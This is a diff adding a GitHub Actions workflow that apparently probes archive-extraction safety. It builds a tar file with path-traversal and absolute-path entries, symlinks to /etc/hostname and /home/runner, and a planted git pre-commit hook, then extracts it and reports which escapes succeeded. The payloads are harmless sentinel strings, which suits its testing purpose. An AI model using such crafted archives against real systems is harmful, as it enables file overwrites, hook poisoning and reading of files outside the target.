@@ -1,0 +1,72 @@
+name: G01 Archive Extraction Boundary Probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: read
+jobs:
+  seed-and-extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create malicious traversal archive
+        shell: bash
+        run: |
+          python3 -c "
+          import tarfile, io, os
+          buf = io.BytesIO()
+          tf = tarfile.open(fileobj=buf, mode='w:')
+          def add(n, c):
+              data = c.encode()
+              info = tarfile.TarInfo(name=n)
+              info.size = len(data)
+              tf.addfile(info, io.BytesIO(data))
+          add('../../../../tmp/g01-escape-explicit.txt', 'G01_TRAVERSAL_ESCAPE_A1B2\n')
+          add('/tmp/g01-absolute-escape.txt', 'G01_ABSOLUTE_PATH_C3D4\n')
+          add('safe-sentinel.txt', 'G01_SAFE_CONTROL_Z9Y8\n')
+          info = tarfile.TarInfo(name='leak-link')
+          info.type = tarfile.SYMTYPE
+          info.linkname = '../../../etc/hostname'
+          tf.addfile(info)
+          info2 = tarfile.TarInfo(name='home-link')
+          info2.type = tarfile.SYMTYPE
+          info2.linkname = '/home/runner'
+          tf.addfile(info2)
+          add('.git/hooks/pre-commit', '#!/bin/bash\necho G01_GIT_HOOK_POISONED_H7G8\n')
+          tf.close()
+          with open('g01-traversal-attack.tar', 'wb') as f:
+              f.write(buf.getvalue())
+          os.system('tar -tvf g01-traversal-attack.tar')
+          "
+      - name: Upload traversal archive as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: g01-traversal-attack-20260804
+          path: g01-traversal-attack.tar
+      - name: Extract and probe boundary
+        shell: bash
+        run: |
+          mkdir -p extracted
+          cp g01-traversal-attack.tar extracted/
+          cd extracted
+          tar -xvf g01-traversal-attack.tar 2>&1 || true
+          echo "=== EXTRACTION RESULT ==="
+          ls -la
+          echo "--- Boundary checks ---"
+          test -f /tmp/g01-absolute-escape.txt 2>/dev/null && echo "G01_CRITICAL_ABSOLUTE_ESCAPE" || echo "G01_BOUNDARY_OK_ABSOLUTE"
+          test -f ../../../../tmp/g01-escape-explicit.txt 2>/dev/null && echo "G01_CRITICAL_TRAVERSAL_ESCAPE" || echo "G01_BOUNDARY_OK_TRAVERSAL"
+          test -f ../../../g01-escape-explicit.txt 2>/dev/null && echo "G01_CRITICAL_TRAVERSAL_UP" || echo "G01_BOUNDARY_OK_TRAVERSAL_UP"
+          test -L leak-link 2>/dev/null && echo "G01_SYMLINK_PRESERVED link=$(readlink leak-link)" && cat leak-link 2>/dev/null && echo "G01_SYMLINK_READ_OK" || echo "G01_SYMLINK_BLOCKED"
+          test -L home-link 2>/dev/null && echo "G01_HOME_SYMLINK preserved" && ls home-link/ 2>/dev/null | head -5 || echo "G01_HOME_SYMLINK_BLOCKED"
+          test -f .git/hooks/pre-commit 2>/dev/null && echo "G01_GIT_HOOK_EXTRACTED" || echo "G01_GIT_HOOK_BLOCKED"
+          pwd
+          echo "HOME=${HOME}"
+          echo "GITHUB_WORKSPACE=${GITHUB_WORKSPACE}"
+          find /tmp -name "g01-*" -type f 2>/dev/null | head -10
+          echo "G01_PROBE_COMPLETE_20260804"
+      - name: Upload extraction result
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: g01-extraction-boundary-result-20260804
+          path: extracted/
+          if-no-files-found: warn
